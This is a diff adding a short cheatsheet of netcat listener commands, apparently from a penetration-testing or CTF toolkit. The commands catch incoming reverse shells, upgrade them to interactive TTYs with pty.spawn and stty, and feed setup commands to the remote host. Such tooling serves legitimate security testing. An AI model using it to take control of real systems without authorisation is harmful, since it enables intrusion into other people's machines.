@@ -1,0 +1,11 @@
+% Listeners
+
+$ local_ip: echo $(ip -br a sh dev tun0 2>/dev/null||ip -br a sh dev eth0) | awk '{print $3}' | cut -d '/' -f1
+$ port: echo '443 1234 4444 32000' | tr ' ' '\n'
+$ shell: echo '/bin/bash /bin/zsh /bin/ash /bin/dash /bin/ksh /bin/sh bash zsh ash dash ksh sh' | tr ' ' '\n'
+$ term: echo 'screen xterm xterm-256color' | tr ' ' '\n'
+
+
+# stabilized fancy beefy gordita crunch shell
+$stabiliser: echo 'script -qc "<shell>" /dev/null#python -c "import pty;pty.spawn(\"<shell>\")"#python3 -c "import pty;pty.spawn(\"<shell>\")"' | tr '#' '\n'
+stty raw -echo; (echo '<stabiliser>';echo pty;echo;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)";echo export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; export TERM=<term>; alias ll='ls -lsaht'; echo clear; echo id;cat) | nc -lvnp <port> && reset
